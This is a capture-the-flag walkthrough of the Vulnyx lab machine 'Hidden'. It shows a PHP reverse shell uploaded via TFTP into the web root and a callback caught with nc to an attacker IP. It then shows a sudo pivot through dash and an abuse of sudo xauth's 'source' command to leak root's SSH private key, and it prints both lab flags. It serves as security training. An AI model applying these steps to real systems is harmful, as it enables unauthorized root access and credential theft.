# Vulnyx: Hidden

| | |
|---|---|
| **Platform** | Vulnyx |
| **OS** | Linux |
| **Difficulty** | Easy |
| **Creator** | `d4t4s3c` |
| **Tools used** | `nmap` · `ffuf` · `tftp` · `curl` · `nc` · `sed` · `ssh` |
| **Tags** | `#TFTP` `#FileUpload` `#RCE` `#SudoAbuse` `#ArbitraryFileRead` `#SSHKeyLeak` |
| **URL** | https://vulnyx.com/machines/ |

A UDP scan turns up TFTP, sharing the same directory as the web root — enough to upload a PHP reverse shell directly and trigger it over HTTP. A `sudo` rule pivots to `satan` through `dash`, and a second rule allows running `xauth` as root. Its `source` command, meant to load X11 authority commands from a file, ends up leaking the full contents of root's private SSH key through its own "unknown command" error messages.

## Enumeration

### Port Enumeration

A full TCP port scan comes first:

```bash
$ sudo nmap -p- -sS --open --min-rate 5000 -n -vvv -Pn hidden.nyx

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: 08:00:27:E7:7D:7A (Oracle VirtualBox virtual NIC)
```

Two TCP ports come back open: **22 (SSH)** and **80 (HTTP)**. A version and script scan on both fills in the details:

```bash
$ sudo nmap -p 22,80 -sCV hidden.nyx

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey:
|   3072 f0:e6:24:fb:9e:b0:7a:1a:bd:f7:b1:85:23:7f:b1:6f (RSA)
|   256 99:c8:74:31:45:10:58:b0:ce:cc:63:b4:7a:82:57:3d (ECDSA)
|_  256 60:da:3e:31:38:fa:b5:49:ab:48:c3:43:2c:9f:d1:32 (ED25519)
80/tcp open  http    Apache httpd 2.4.56 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.56 (Debian)
MAC Address: 08:00:27:E7:7D:7A (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

A UDP scan follows, since UDP services never show up in a TCP-only sweep:

```bash
$ sudo nmap -sU --top-ports 1000 hidden.nyx

PORT    STATE         SERVICE
68/udp  open|filtered dhcpc
69/udp  open|filtered tftp
MAC Address: 08:00:27:E7:7D:7A (Oracle VirtualBox virtual NIC)
```

That turns up **69/udp**, TFTP — a simple, unauthenticated file transfer protocol.

### Web Enumeration

The main page:

```
http://hidden.nyx
```

<img src="../Images/hidden/Pasted image 20260726201645.png"/>

```bash
$ ffuf -u http://hidden.nyx/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e .php,.html,.txt -ic

[Status: 200, Size: 10701, Words: 3427, Lines: 369, Duration: 165ms]
.html                  [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 522ms]
index.html             [Status: 200, Size: 10701, Words: 3427, Lines: 369, Duration: 832ms]
.php                   [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 974ms]
                       [Status: 200, Size: 10701, Words: 3427, Lines: 369, Duration: 6ms]
.php                   [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 6ms]
.html                  [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 11ms]
server-status          [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 20ms]
:: Progress: [882188/882188] :: Job [1/1] :: 5882 req/sec :: Duration: [0:03:33] :: Errors: 0 ::
```

The web server only serves the default Apache page — nothing to work with over HTTP alone. TFTP is the more interesting lead.

## Initial Access

### File Upload via TFTP → RCE

TFTP's root directory turns out to be the same as the web server's — anything uploaded over TFTP becomes immediately reachable over HTTP. So a PHP reverse shell goes up over TFTP:

```bash
$ tftp hidden.nyx 69
tftp> put rev_shell.php
tftp> quit
```

Requesting it over HTTP triggers it:

```bash
$ curl -s "http://hidden.nyx/rev_shell.php"
```

A listener catches the callback:

```bash
$ nc -nlvp <PORT>
listening on [any] <PORT> ...
connect to [<ATTACKER_IP>] from (UNKNOWN) [hidden.nyx] 34144
Linux hidden 5.10.0-22-amd64 #1 SMP Debian 5.10.178-3 (2023-04-22) x86_64 GNU/Linux
 19:36:02 up 7 min,  0 users,  load average: 9.38, 11.77, 5.49
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
www-data@hidden:~$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

A quick pty upgrade makes the shell usable:

```bash
python3 -c 'import pty; pty.spawn ("/bin/bash")'
[Ctrl + z]
stty raw -echo; fg
export TERM=xterm
```

## Lateral Movement

### Escalating to satan

```bash
www-data@hidden:/$ sudo -l
sudo: unable to resolve host hidden: Name or service not known
Matching Defaults entries for www-data on hidden:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on hidden:
    (satan) NOPASSWD: /usr/bin/dash
```

The rule lets `www-data` run `/usr/bin/dash` as `satan` — and `dash` is a shell, so that's a direct pivot into `satan`'s account:

```bash
www-data@hidden:/$ sudo -u satan /usr/bin/dash
sudo: unable to resolve host hidden: Name or service not known
satan@hidden:/$ id
uid=1000(satan) gid=1000(satan) groups=1000(satan)
satan@hidden:/$ ls -l /home/satan
total 4
-r-------- 1 satan satan 33 Apr 30  2023 user.txt
satan@hidden:/$ cat /home/satan/user.txt
2cf56996ccb702cd415d40ed9cdbb93c
```

> **User flag:** `2cf56996ccb702cd415d40ed9cdbb93c`

## Privilege Escalation

### Arbitrary File Read via `xauth`

```bash
satan@hidden:/$ sudo -l
sudo: unable to resolve host hidden: Name or service not known
Matching Defaults entries for satan on hidden:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User satan may run the following commands on hidden:
    (ALL : ALL) NOPASSWD: /usr/bin/geany, /usr/bin/xauth
```

`satan` can run `/usr/bin/xauth` as root without a password. `xauth`'s `source` command is meant to read a file full of `xauth` commands and execute each one — but when a line isn't a valid command, it echoes the line back as part of an "unknown command" error instead of just failing silently. Pointed at a file that isn't actually a list of `xauth` commands, that error output becomes a read primitive for whatever the root-owned `xauth` process can access — root's own private key, in this case:

```bash
satan@hidden:/$ sudo /usr/bin/xauth
xauth> source /root/.ssh/id_rsa
```

<img src="../Images/hidden/Pasted image 20260726202004.png"/>

The key's contents are buried inside repeated "unknown command" lines. A `sed` substitution strips everything else, leaving just the recovered key:

```bash
$ sed -E 's/^\/usr\/bin\/xauth: \/root\/\.ssh\/id_rsa:[0-9]+:\s+unknown command "(.*)"$/\1/' output.txt > root_rsa
$ chmod 600 root_rsa
```

```bash
$ ssh root@hidden.nyx -i root_rsa
Last login: Thu Jul 13 23:31:02 2023
root@hidden:~# id
uid=0(root) gid=0(root) groups=0(root)
root@hidden:~# ls -la /root
total 44
drwx------  6 root root 4096 Jul 26 19:40 .
drwxr-xr-x 18 root root 4096 Apr 30  2023 ..
lrwxrwxrwx  1 root root    9 Apr 23  2023 .bash_history -> /dev/null
-rw-------  1 root root 3526 Jan 15  2023 .bashrc
drwx------  2 root root 4096 May  1  2023 .cache
drwx------  2 root root 4096 May  1  2023 .config
drwx------  3 root root 4096 Jan 15  2023 .local
drw-------  3 root root  161 Jul  9  2019 .profile
-rw-------  1 root root   33 Apr 30  2023 .root.txt
-r--r--r--  1 root root   66 Apr 30  2023 .selected_editor
-rwxr-xr-x  1 root root   95 Apr 30  2023 .service
drwx------  2 root root 4096 Apr 30  2023 .ssh
-rw-------  2 root root    0 Jul 26 19:40 .Xauthority-c
-rw-------  2 root root    0 Jul 26 19:40 .Xauthority-l
root@hidden:~# cat /root/.root.txt
24f5fe7b1073be0a6f85159d22beaa7a
```

> **Root flag:** `24f5fe7b1073be0a6f85159d22beaa7a`

## Takeaways

- A UDP scan is easy to skip when a target already has interesting TCP services, but it's the only way services like TFTP, SNMP, or DNS ever show up — worth running as a matter of course, not just when TCP comes up empty.
- Interactive tools granted through `sudo` don't need an obvious "run a command" feature to be dangerous — an error message that echoes back unparsed input is just as effective a file-read primitive as an intentional one.
- A `sudo` rule doesn't have to point at something with a documented GTFOBins entry to be exploitable; `xauth` isn't a typical target, but its own error-handling behavior was enough on its own.